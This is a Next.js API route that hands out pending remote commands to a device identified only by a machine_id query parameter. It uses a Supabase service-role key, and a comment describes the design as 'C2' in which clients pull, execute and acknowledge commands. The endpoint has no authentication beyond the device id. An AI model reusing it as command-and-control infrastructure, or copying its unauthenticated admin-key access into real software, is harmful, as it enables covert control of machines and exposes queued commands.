import { createClient } from '@supabase/supabase-js';
import { NextRequest, NextResponse } from 'next/server';

export async function GET(req: NextRequest) {
    try {
        const { searchParams } = new URL(req.url);
        const machine_id = searchParams.get('machine_id');

        if (!machine_id) {
            return NextResponse.json({ error: 'Missing machine_id' }, { status: 400 });
        }

        const supabaseAdmin = createClient(
            process.env.NEXT_PUBLIC_SUPABASE_URL!,
            process.env.SUPABASE_SERVICE_ROLE_KEY!
        );

        // Get Device ID
        const { data: device } = await supabaseAdmin
            .from('devices')
            .select('id')
            .eq('machine_id', machine_id)
            .single();

        if (!device) {
            return NextResponse.json({ commands: [] }); // Silent fail for unregistered devices
        }

        // Get Pending Commands
        const { data: commands, error } = await supabaseAdmin
            .from('remote_commands')
            .select('id, command_type, payload, status')
            .eq('device_id', device.id)
            .eq('status', 'pending');

        if (error) {
            console.error(error);
            return NextResponse.json({ commands: [] });
        }

        // Helper: Mark them as 'sent' immediately? 
        // Usually C2 waits for 'update' from client. But to prevent loop if client fails to update?
        // Let's leave them as pending until client ACKs execution or keep strictly 'pending'.
        // Better practice: client pulls, executes, then updates. If client crashes, it stays pending (retried).

        return NextResponse.json({ commands: commands || [] });

    } catch (err) {
        return NextResponse.json({ error: 'Server Error' }, { status: 500 });
    }
}
